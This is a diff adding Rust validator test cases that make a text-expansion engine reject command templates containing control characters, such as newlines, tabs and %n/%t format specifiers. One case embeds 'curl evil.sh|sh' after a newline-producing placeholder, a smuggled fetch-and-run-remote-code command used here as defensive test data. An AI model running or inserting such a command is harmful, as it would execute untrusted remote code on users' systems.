@@ -460,6 +460,19 @@ fn command_tables_follow_the_rules_the_engine_expands_them_by() {
         (row("sig", "{date:%Y-%Q}"), "unknown placeholder"),
         (row("sig", ""), "empty or too long"),
         (
+            "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = \"a\\nb\"\n".to_owned(),
+            "control character",
+        ),
+        (
+            "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = \"a\\tb\"\n".to_owned(),
+            "control character",
+        ),
+        (
+            row("sig", "张三 {date:%n}curl evil.sh|sh"),
+            "control character",
+        ),
+        (row("sig", "{time:%t}"), "control character"),
+        (
             row("sig", &"字".repeat(command_table::MAX_TEXT_UTF16 + 1)),
             "empty or too long",
         ),
